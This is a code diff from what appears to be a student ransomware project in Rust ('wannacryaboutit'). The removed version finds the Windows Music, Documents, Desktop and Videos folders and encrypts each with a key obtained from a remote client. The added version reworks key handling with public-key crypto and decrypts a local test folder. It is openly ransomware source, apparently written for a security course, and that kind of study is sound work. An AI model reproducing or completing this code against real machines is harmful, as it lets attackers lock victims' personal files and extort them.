@@ -1,63 +1,47 @@
-mod cryptography;
-mod gui;
-mod networking;
-
-use std::path::Path;
-use std::path::PathBuf;
 use anyhow::Result;
 
-use cryptography::encrypt::{encrypt_folder, decrypt_folder};
-use networking::client::{ get_key, gen_key };
+use crate::cryptography::encrypt::encrypt_folder;
+use crate::cryptography::encrypt::decrypt_folder;
+use crate::networking::client::gen_key;
+use crate::networking::client::get_key;
 
-use windows::Win32::UI::Shell::{
-    SHGetKnownFolderPath,
-    FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos,
-    KNOWN_FOLDER_FLAG
-};
-use windows::core::PWSTR;
+use std::path::Path;
+use std::fs;
+
+use sodiumoxide::crypto::box_::{PublicKey, SecretKey};
 
 // ENCRYPTING
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    // let key: [u8; 32] = *b"12345678901234567890123456789012";
-    let key: [u8; 32] = gen_key().await?;
+    sodiumoxide::init().unwrap();
 
-    let mut paths = [FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos];
+    // DECRYPT
+    let pk_bytes = fs::read("/Users/rik/dev/2IC80-wannacryaboutit/ransomware/src/test/public_key.donotdelete")?;
+    let pk = PublicKey::from_slice(&pk_bytes)
+        .ok_or("key not good")? as PublicKey;
 
-    unsafe {
-        for path in paths {
-            let path_ptr: PWSTR = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None).unwrap();
-            let path_str = path_ptr.to_string().unwrap();
-            let path_buf: PathBuf = path_str.into();
-            println!("path: {:?}", path_buf);
+    let sk = get_key(&pk).await?;
 
+    let path = Path::new("/Users/rik/dev/2IC80-wannacryaboutit/ransomware/src/test");
 
-            encrypt_folder(&path_buf, &key)?;
-        }
+    match decrypt_folder(path, &pk, &sk) {
+        Ok(_) => println!("✓ Successfully encrypted: {:?}", path),
+        Err(e) => println!("✗ Error encrypting {:?}: {}", path, e),
     }
 
     Ok(())
+
+    // ENCRYPT
+    // let pk: PublicKey = gen_key().await?;
+
+    // let path = Path::new("/Users/rik/dev/2IC80-wannacryaboutit/ransomware/src/test");
+
+    // match encrypt_folder(path, &pk) {
+    //     Ok(_) => println!("✓ Successfully encrypted: {:?}", path),
+    //     Err(e) => println!("✗ Error encrypting {:?}: {}", path, e),
+    // }
+
+    // fs::write("/Users/rik/dev/2IC80-wannacryaboutit/ransomware/src/test/public_key.donotdelete", &pk)?;
+
+    // Ok(())
 }
-
-// DECRYPTING
-// #[tokio::main]
-// async fn main() -> Result<(), Box<dyn std::error::Error>> {
-//     // let key: [u8; 32] = *b"12345678901234567890123456789012";
-//     let key: [u8; 32] = get_key(&"123").await?;
-
-//     let mut paths = [FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos];
-//     println!("{:?}", key);
-//     unsafe {
-//         for path in paths {
-//             let path_ptr: PWSTR = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None).unwrap();
-//             let path_str = path_ptr.to_string().unwrap();
-//             let path_buf: PathBuf = path_str.into();
-//             println!("path: {:?}", path_buf);
-
-
-//             decrypt_folder(&path_buf, &key)?;
-//         }
-//     }
-
-//     Ok(())
-// }
